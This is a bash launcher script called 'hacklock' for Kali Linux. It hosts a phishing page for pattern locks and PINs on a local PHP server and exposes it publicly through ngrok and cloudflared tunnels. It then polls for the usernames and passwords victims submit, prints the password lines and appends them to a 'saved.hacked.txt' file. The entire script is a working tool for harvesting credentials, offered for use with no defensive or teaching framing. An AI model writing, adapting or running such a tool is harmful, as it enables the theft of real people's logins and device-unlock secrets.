
#!/usr/bin/env bash
# Minimal Kali-friendly hacklock launcher (single-file)
# Put this script in ~/hacklock and run: ./hacklock.sh

set -u
HOME_DIR="${HOME:-/root}/hacklock"

# ---------- utilities ----------
find_exec() {
  if command -v "$1" >/dev/null 2>&1; then
    command -v "$1"
  elif [[ -x "$HOME_DIR/$1" ]]; then
    echo "$HOME_DIR/$1"
  else
    echo ""
  fi
}

# ---------- banner ----------
banner() {
  clear
  printf "\n"
  printf "  _|    _|                      _|        _|                            _|\n"
  printf "  |    |    |||    |||  _|  _|    |          ||      |||  |  | \n"
  printf "  ||||  _|    _|  _|        ||      _|        _|    _|  _|        |\n"
  printf "  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  |\n"
  printf "  |    |    |||    |||  |    |  ||||    ||      |||  _|    _| v2.0 \n"
  printf "\n"
  printf "           >> Script by N17R0 (Kali-friendly edit) <<\n\n"
}

# ---------- dependencies ----------
dependencies() {
  local miss=0
  for cmd in php curl wget; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      echo "[!] Missing: $cmd"
      miss=1
    fi
  done
  if [[ $miss -eq 1 ]]; then
    echo "[!] Install missing packages and re-run. (eg: sudo apt update && sudo apt install php curl wget -y)"
    return 1
  fi
  return 0
}

# ---------- catch credentials ----------
catch_cred() {
  local users_file="$HOME_DIR/core/pattern/usernames.txt"
  if [[ -f "$users_file" ]]; then
    echo "[*] Found usernames file: $users_file"
    grep -n '.' "$users_file" || true
    # extract password pattern if present
    if grep -q 'password' "$users_file"; then
      echo "[*] Extracting password lines:"
      grep -i 'password' "$users_file" | sed 's/^/    /'
    fi
    cat "$users_file" >> "$HOME_DIR/core/pattern/saved.hacked.txt"
    echo "[*] Saved appended to core/pattern/saved.hacked.txt"
    rm -f "$users_file"
  fi
}

# ---------- checkfound loop ----------
checkfound() {
  echo
  echo "[*] Waiting for pins/creds. Press Ctrl+C to stop..."
  while true; do
    catch_cred
    sleep 1
  done
}

# ---------- start server & forwarders ----------
start() {
  # cleanup
  rm -f "$HOME_DIR/core/pattern/ip.txt" 2>/dev/null || true
  rm -f "$HOME_DIR/core/pattern/usernames.txt" 2>/dev/null || true
  rm -f "$HOME_DIR/cloudflare-log" 2>/dev/null || true

  # ensure pattern directory exists
  if [[ ! -d "$HOME_DIR/core/pattern" ]]; then
    echo "[!] Missing: $HOME_DIR/core/pattern (create and put site files there)"
    return 1
  fi

  # php
  if ! command -v php >/dev/null 2>&1; then
    echo "[!] php not found. Install php and retry."
    return 1
  fi

  # start local php server
  echo "[*] Starting PHP server on 127.0.0.1:5678 ..."
  cd "$HOME_DIR/core/pattern" || return 1
  php -S 127.0.0.1:5678 >/dev/null 2>&1 &
  PHP_PID=$!
  sleep 1

  # ngrok
  NGROK_BIN=$(find_exec ngrok)
  if [[ -n "$NGROK_BIN" ]]; then
    echo "[*] Starting ngrok ..."
    nohup "$NGROK_BIN" http 127.0.0.1:5678 >/dev/null 2>&1 &
    sleep 2
    # try to get public url from api
    if curl -s http://127.0.0.1:4040/api/tunnels >/dev/null 2>&1; then
      NGROK_LINK=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oE '"public_url":"https://[^"]+' | head -n1 | sed 's/.*:"//')
    else
      NGROK_LINK=""
    fi
  else
    NGROK_LINK=""
  fi

  # cloudflared
  CLOUDFLARE_BIN=$(find_exec cloudflared)
  if [[ -n "$CLOUDFLARE_BIN" ]]; then
    echo "[*] Starting cloudflared ..."
    LOGFILE="$HOME_DIR/cloudflare-log"
    nohup "$CLOUDFLARE_BIN" tunnel --url http://127.0.0.1:5678 > "$LOGFILE" 2>&1 &
    sleep 6
    if [[ -f "$LOGFILE" ]]; then
      CLOUDFLARE_LINK=$(grep -oE 'https://[-0-9a-z]+\.trycloudflare\.com' "$LOGFILE" | head -n1 || true)
    else
      CLOUDFLARE_LINK=""
    fi
  else
    CLOUDFLARE_LINK=""
  fi

  # print results
  if [[ -n "$NGROK_LINK" ]]; then
    printf "[*] (NGROK) link: %s\n" "$NGROK_LINK"
  else
    echo "[!] ngrok not running or API not available."
  fi
  if [[ -n "$CLOUDFLARE_LINK" ]]; then
    printf "[*] (Cloudflare) link: %s\n" "$CLOUDFLARE_LINK"
  else
    echo "[!] cloudflared link not found in logfile."
  fi

  checkfound
}

# ---------- fixer ----------
fixer() {
  NGROK_BIN=$(find_exec ngrok)
  if [[ -z "$NGROK_BIN" ]]; then
    echo "[!] ngrok not found. Put ngrok binary in PATH or $HOME_DIR/"
    return 1
  fi
  read -p $'\n[+] Enter NGROK AUTHTOKEN: ' token
  if [[ -n "$token" ]]; then
    "$NGROK_BIN" authtoken "$token"
    echo "[*] ngrok authtoken set."
  else
    echo "[!] No token provided."
  fi
}

# ---------- menu ----------
menu() {
  while true; do
    echo
    echo "1) Start pattern server"
    echo "2) Fix ngrok (set authtoken)"
    echo "3) Exit"
    read -p $'\nChoose: ' opt
    case "$opt" in
      1) start ;;
      2) fixer ;;
      3) exit 0 ;;
      *) echo "Invalid choice." ;;
    esac
  done
}

# ---------- main ----------
banner
if ! dependencies; then
  echo "[!] Resolve dependencies then run again."
  exit 1
fi
menu
EOF
